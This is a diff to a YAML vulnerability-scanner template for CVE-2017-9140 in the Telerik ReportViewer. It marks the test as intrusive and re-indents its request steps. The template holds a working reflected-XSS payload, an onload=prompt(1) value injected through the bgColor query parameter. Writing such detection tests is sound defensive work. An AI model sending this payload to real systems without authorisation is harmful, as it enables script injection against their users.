@@ -18,6 +18,8 @@ info:
   cve:
     - CVE-2017-9140
 
+settings:
+  nature: INTRUSIVE
 api_selection_filters:
   method:
     neq: "OPTIONS"
@@ -31,13 +33,13 @@ execute:
   type: single
   requests:
     - req:
-      - modify_method: GET
-      - modify_url: "/Telerik.ReportViewer.axd"
-      - replace_body: '{}'
-      - add_query_param:
-          optype: "Parameters"
-      - add_query_param:
-          bgColor: "_000000%22onload=%22prompt(1)"
+        - modify_method: GET
+        - modify_url: "/Telerik.ReportViewer.axd"
+        - replace_body: '{}'
+        - add_query_param:
+            optype: "Parameters"
+        - add_query_param:
+            bgColor: "_000000%22onload=%22prompt(1)"
 
 validate:
   response_code:
